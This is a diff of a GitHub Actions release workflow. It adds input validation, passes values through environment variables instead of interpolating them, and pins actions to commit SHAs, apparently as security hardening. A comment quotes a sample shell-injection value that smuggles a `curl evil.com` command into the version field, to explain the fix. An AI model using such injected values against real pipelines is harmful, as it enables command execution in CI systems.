@@ -29,7 +29,24 @@ jobs:
         uses: actions/checkout@v6
 
       - name: Get version
-        run: echo "VERSION=${{ github.event.inputs.version || '${GITHUB_REF#refs/tags/v}' }}" >> $GITHUB_ENV
+        # SECURITY (C1 hardening, redteam-services 2026-05-04): validate version
+        # before exporting. Dispatch-only access still warrants input validation —
+        # an attacker with write access could otherwise inject shell via
+        # `1.0.0"; curl evil.com; "` into the version field.
+        env:
+          DISPATCH_VERSION: ${{ github.event.inputs.version }}
+        run: |
+          if [ -n "${DISPATCH_VERSION:-}" ]; then
+            CANDIDATE="$DISPATCH_VERSION"
+          else
+            CANDIDATE="${GITHUB_REF#refs/tags/v}"
+          fi
+          # Strict semver allowlist: digits.digits.digits[-prerelease][+build] (no shell metas).
+          if ! printf '%s' "$CANDIDATE" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+([.-][A-Za-z0-9.-]+)?(\+[A-Za-z0-9.-]+)?$'; then
+            echo "ERROR: invalid version format: $CANDIDATE" >&2
+            exit 1
+          fi
+          echo "VERSION=$CANDIDATE" >> "$GITHUB_ENV"
 
       - name: Create release
         id: create-release
@@ -53,7 +70,7 @@ jobs:
     needs: create-release
     steps:
       - uses: actions/checkout@v6
-      - uses: pnpm/action-setup@v5
+      - uses: pnpm/action-setup@a8198c4bff370c8506180b035930dea56dbd5288 # v5
         with:
           version: 9.15.3
       - uses: actions/setup-node@v6
@@ -93,7 +110,7 @@ jobs:
         uses: actions/checkout@v6
 
       - name: Setup pnpm
-        uses: pnpm/action-setup@v5
+        uses: pnpm/action-setup@a8198c4bff370c8506180b035930dea56dbd5288 # v5
         with:
           version: 9.15.3
 
@@ -104,7 +121,7 @@ jobs:
           cache: 'pnpm'
 
       - name: Setup Rust
-        uses: actions-rust-lang/setup-rust-toolchain@v1
+        uses: actions-rust-lang/setup-rust-toolchain@1fbea72663f6d4c03efaab13560c8a24cfd2a7cc # v1.9.0
         with:
           toolchain: ${{ env.RUST_VERSION }}
 
@@ -137,7 +154,7 @@ jobs:
             libwebp-dev
 
       - name: Cache Rust dependencies
-        uses: Swatinem/rust-cache@v2
+        uses: Swatinem/rust-cache@23869a5bd66c73db3c0ac40331f3206eb23791dc # v2.9.1
         with:
           workspaces: apps/desktop/src-tauri
 
@@ -174,11 +191,20 @@ jobs:
     steps:
       - name: Publish release
         uses: actions/github-script@v8
+        env:
+          # SECURITY (C1 hardening, redteam-services 2026-05-04): pass release_id via env
+          # to keep the github-script body free of ${{ }} interpolation. release_id is a
+          # numeric API value, but env-passthrough is the safer default pattern.
+          RELEASE_ID: ${{ needs.create-release.outputs.release_id }}
         with:
           script: |
+            const releaseId = Number(process.env.RELEASE_ID);
+            if (!Number.isInteger(releaseId) || releaseId <= 0) {
+              throw new Error(`Invalid release_id: ${process.env.RELEASE_ID}`);
+            }
             await github.rest.repos.updateRelease({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              release_id: ${{ needs.create-release.outputs.release_id }},
+              release_id: releaseId,
               draft: false
             })
